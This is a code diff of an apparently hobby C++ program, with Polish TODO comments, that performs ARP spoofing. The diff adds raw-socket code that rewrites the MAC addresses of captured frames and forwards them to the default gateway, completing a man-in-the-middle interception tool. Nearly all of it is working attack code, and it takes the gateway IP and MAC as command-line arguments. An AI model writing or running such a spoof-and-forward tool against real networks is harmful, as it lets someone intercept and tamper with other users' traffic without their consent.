@@ -15,17 +15,12 @@
 #include <sys/ioctl.h>
 #include <csignal>
 
- #include <thread>
- #include <chrono>
+#include <thread>
+#include <chrono>
 #include <iostream>
 
 
 // TODO
-// 1. Cleanup
-//   - C -> C++
-//   - spoof
-//   - argumenty z linii poleceń
-// 2. Zamknięcie na signal
 // 3. capture - zasymulować ip forward
 //   - filtr na pcap
 //   - przesyłanie dalej
@@ -61,7 +56,7 @@ void *spoof(const char *interface_name, char *address) {
             ETHERTYPE_ARP,                   /* ethertype            */
             ln);                             /* libnet context       */
 
-    while (true) {
+    while (true) {// TODO sigint
         libnet_write(ln);
         std::chrono::seconds sec = std::chrono::seconds(1);
         std::this_thread::sleep_for(sec);
@@ -69,8 +64,10 @@ void *spoof(const char *interface_name, char *address) {
 
 }
 
-void *capture(char *interface_name) {
+void *capture(char *interface_name, char* deafault_gateway_mac) {
     struct ifreq interface_struct;          // interface structure -> needed for interface identification
+
+    // RECEIVE SOCKET
     struct sockaddr_ll sall;                // address sockeet structure -> for binding
 
     sfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));        // get socket's descriptor no
@@ -89,7 +86,21 @@ void *capture(char *interface_name) {
     // bind sfd descriptor with sall structure:
     bind(sfd, (struct sockaddr *) &sall, sizeof(struct sockaddr_ll));
 
-    while (true) {
+    // SEND SOCKET
+    int sfd_send;
+    struct sockaddr_ll sall_send;                    
+
+    sfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+    strncpy(interface_struct.ifr_name, interface_name, IFNAMSIZ);
+    memset(&sall_send, 0, sizeof(struct sockaddr_ll));
+    sall_send.sll_family = AF_PACKET;
+    sall_send.sll_protocol = htons(ETH_P_ALL);
+    sall_send.sll_ifindex = interface_struct.ifr_ifindex;
+    sall_send.sll_hatype = ARPHRD_ETHER;
+    sall_send.sll_pkttype = PACKET_OUTGOING;
+    sall_send.sll_halen = ETH_ALEN;
+
+    while (true) {// TODO sigint
         // ALLOCATE MEMORY FOR FRAME
         char *frame = static_cast<char *>(malloc(ETH_FRAME_LEN));
         memset(frame, 0, ETH_FRAME_LEN);
@@ -102,15 +113,37 @@ void *capture(char *interface_name) {
         // TODO wziąć zapytania na bramę i wysłać je tam (zmienić adres MAC - wprowadzany z linii poleceń)
         // DESTINATION IP           : DEFAULT GATEWAY
         // DESTINATION MAC ADDRESS  : MY COMPUTER'S ID
-        if (fhead->h_source[5] != 78 && fhead->h_source[5] != 232 && fhead->h_source[5] != 232) {
+        if (fhead->h_source[5] == 62 && fhead->h_dest[5] == 78) { // TODO póki co odbieramy tylko pakiety z mojego drugiego laptopa :)
+            // PRINT
             printf("[%dB] %02x:%02x:%02x:%02x:%02x:%02x -> ", (int) len,
                    fhead->h_source[0], fhead->h_source[1], fhead->h_source[2],
                    fhead->h_source[3], fhead->h_source[4], fhead->h_source[5]);
             printf("%02x:%02x:%02x:%02x:%02x:%02x | ",
                    fhead->h_dest[0], fhead->h_dest[1], fhead->h_dest[2],
                    fhead->h_dest[3], fhead->h_dest[4], fhead->h_dest[5]);
+
+
             printf("\n\n");
+
+            // SEND FRAME
+            // Change destination address to default gateway MAC
+            sscanf(deafault_gateway_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+                   &sall_send.sll_addr[0], &sall_send.sll_addr[1], &sall_send.sll_addr[2],
+                   &sall_send.sll_addr[3], &sall_send.sll_addr[4], &sall_send.sll_addr[5]);
+            sfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+            memcpy(fhead->h_dest, &sall_send.sll_addr, ETH_ALEN);
+
+            ioctl(sfd_send, SIOCGIFHWADDR, &interface_struct);
+            memcpy(fhead->h_source, &interface_struct.ifr_hwaddr.sa_data, ETH_ALEN);
+
+            if (sendto(sfd_send, frame, (int)len, 0,(struct sockaddr*) &sall_send, sizeof(struct sockaddr_ll)) < 0) {
+               printf("Error while sending: %s\n", strerror(errno));
+            } else {
+               printf("Message sent!\n");
+            }
         }
+
+        close(sfd_send);
         free(frame);
     }
 }
@@ -123,15 +156,15 @@ void stop(int signal) {
 }
 
 int main(int argc, char **argv) {
-    if (argc < 3) {
-        std::cerr << "Bad arguments count! Arguments are: INTERFACE DEFAULT_GATEWAY_IP\n";
+    if (argc < 4) {
+        std::cerr << "Bad arguments count! Arguments are: INTERFACE DEFAULT_GATEWAY_IP DEFAULT_GATEWAY_MAC\n";
         exit(EXIT_FAILURE);
     }
 
     std::signal(SIGINT, stop);
 
     std::thread arp_spoofer(spoof, argv[1], argv[2]);
-    std::thread capturer(capture, argv[1]);
+    std::thread capturer(capture, argv[1], argv[3]);
 
     arp_spoofer.join();
     capturer.join();
